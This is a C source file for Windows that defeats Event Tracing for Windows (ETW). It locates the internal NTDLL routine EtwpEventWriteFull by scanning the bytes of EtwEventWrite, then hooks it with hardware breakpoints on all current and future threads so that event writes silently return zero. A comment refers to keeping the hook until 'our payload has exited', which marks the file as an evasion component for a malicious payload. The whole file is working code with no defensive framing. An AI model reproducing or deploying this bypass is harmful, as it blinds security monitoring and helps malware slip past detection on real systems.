#include <Windows.h>
#include "HardwareBreaking.h"
#include "EtwBypass.h"


#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode


// Get the address of 'EtwpEventWriteFull'
PVOID FetchEtwpEventWriteFull() {

	INT		i = 0;
	DWORD	dwOffSet = 0x00;
	PBYTE	pEtwEventFunc = NULL;

	// Both "EtwEventWrite" OR "EtwEventWriteFull" will work
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc)
		return NULL;

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)&pEtwEventFunc[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE)
		return NULL;

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	dwOffSet = *(DWORD*)pEtwEventFunc;

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}

VOID EtwpEventWriteFullDetour(PCONTEXT Ctx) {

	RETURN_VALUE(Ctx, (ULONG)0);
	BLOCK_REAL(Ctx);

	CONTINUE_EXECUTION(Ctx);
}

BOOL BypassETW()
{
	PVOID pEtwpEventWriteFull = FetchEtwpEventWriteFull();
	if (!pEtwpEventWriteFull)
		return -1;

	// Initialize
	if (!InitHardwareBreakpointHooking())
		return -1;

	// Hook 'pEtwpEventWriteFull' to call 'EtwpEventWriteFullDetour' instead - using the Dr0 register
	if (!InstallHardwareBreakingPntHook(pEtwpEventWriteFull, Dr0, EtwpEventWriteFullDetour, ALL_THREADS))
		return -1;

	// Install the same 'ALL_THREADS' hooks on new threads created in the future - using the Dr1 register
	if (!InstallHooksOnNewThreads(Dr1))
		return -1;

	//not needed in this implementation. We do not want to clean up until our payload has exited which the process will exit at that point anyways.
	// Clean up
	// if (!CleapUpHardwareBreakpointHooking())
	//	return -1;

	return TRUE;
}